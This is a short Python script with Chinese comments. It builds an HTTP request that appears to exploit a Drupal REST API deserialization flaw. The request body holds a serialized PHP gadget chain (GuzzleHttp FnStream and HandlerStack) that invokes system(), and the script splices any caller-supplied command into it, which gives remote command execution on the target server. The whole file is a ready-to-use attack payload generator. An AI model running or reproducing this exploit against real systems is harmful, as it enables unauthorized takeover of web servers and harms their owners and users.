import json

def build(ip_port: str, cmd: str):
    # 计算命令长度
    cmd_len = len(cmd)
      
    # 构建URL
    url = f"http://{ip_port}/node/?_format=hal_json"
    
    # 构建请求体
    data = '''
                {
                "link": [
                    {
                    "value": "link",
                    "options": "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\";s:2:\\"id\\";s:30:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:6:\\"system\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}}"
                    }
                ],
                "_links": {
                    "type": {
                    "href": "http://{ip_port}/rest/type/shortcut/default"
                    }
                }
            }'''

    data = data.replace('{ip_port}', ip_port)
    data = data.replace('s:2:\\"id\\"', f's:{cmd_len}:\\"{cmd}\\"')
    headers = {
        "Content-Type": "application/hal+json",
        "Accept": "*/*",
        "Host": ip_port
    }
    
    return {
        "url": url,
        "headers": headers,
        "data": data
    }





  